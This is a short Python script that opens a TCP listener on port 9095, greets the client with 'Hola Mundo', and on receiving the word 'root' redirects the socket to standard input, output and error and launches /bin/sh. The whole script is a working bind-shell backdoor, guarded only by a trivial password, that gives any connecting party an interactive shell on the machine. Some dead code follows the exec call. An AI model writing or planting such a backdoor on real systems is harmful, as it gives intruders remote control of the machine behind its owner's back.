#!/usr/bin/env python
# --*--coding:UTF-8 --*--

import code
import os
import socket
import sys
import datetime


def main():
    # IP address of the server
    host = socket.gethostbyname(socket.gethostname())

    # Port number of the server
    port = 9095

    print("Connecting to {}:{} ...".format(host, port))

    # Create a TCP server socket
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # try:
    #tcp_socket.settimeout(50)
    tcp_socket.bind((host, port))
    tcp_socket.listen(1)

    while True:
        (client, address) = tcp_socket.accept()

        print(f"Address: {address}, client: {client.getpeername()}")

        client.send("Hola Mundo\n".encode())

        response = client.recv(1024).decode()
        print("Response: {}".format(response))

        if response == "root\n":
            print("We are in root")
            for f in range(3):
                os.dup2(client.fileno(), f)
            os.execl("/bin/sh", "/bin/sh")
            code.interact()
            sys.exit()
        else:
            print("exit")
            break

    client.close()
    tcp_socket.close()


# except Exception as E:
#   print("Exception: {} ".format(E))

# Close the socket upon an exception
#  tcp_socket.close()


if __name__ == '__main__':
    main()
